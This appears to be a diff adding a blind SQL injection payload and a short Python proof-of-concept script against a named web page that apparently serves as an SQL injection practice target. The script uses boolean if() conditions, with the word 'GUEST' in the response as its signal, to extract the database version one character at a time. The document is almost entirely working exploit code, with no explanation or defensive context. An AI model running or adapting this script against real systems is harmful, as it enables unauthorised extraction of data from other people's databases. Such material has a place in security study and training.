@@ -1,0 +1,35 @@
+http://root0x00.altervista.org/sqli/blind.php
+
+?id=0 or 1=if( (code),1,2)%23
+
+===========================================================
+# POC :: python
+import requests, time
+
+url = "http://root0x00.altervista.org/sqli/blind.php"
+
+# check length
+length = 0
+for i in range(30):
+    cond = "?id=0 or 1=if(length(version())=%d,1,2)%%23" % (i)
+    url2 = url + cond
+    res = requests.get(url2)
+    if ("GUEST" in res.text):
+        length = i
+        break;
+
+print ("length:", length)
+
+# check answer
+ans = ''
+for i in range(1,length+1):
+    for j in range(33, 128):
+        cond = "?id=0 or 1=if(ascii(substr(version(),%d,1))=%d,1,2)%%23" % (i,j)
+        url2 = url + cond
+        res = requests.get(url2)
+        if ("GUEST" in res.text):
+            ans += chr(j)
+            break
+
+print ("answer:", ans)
+=============================================================
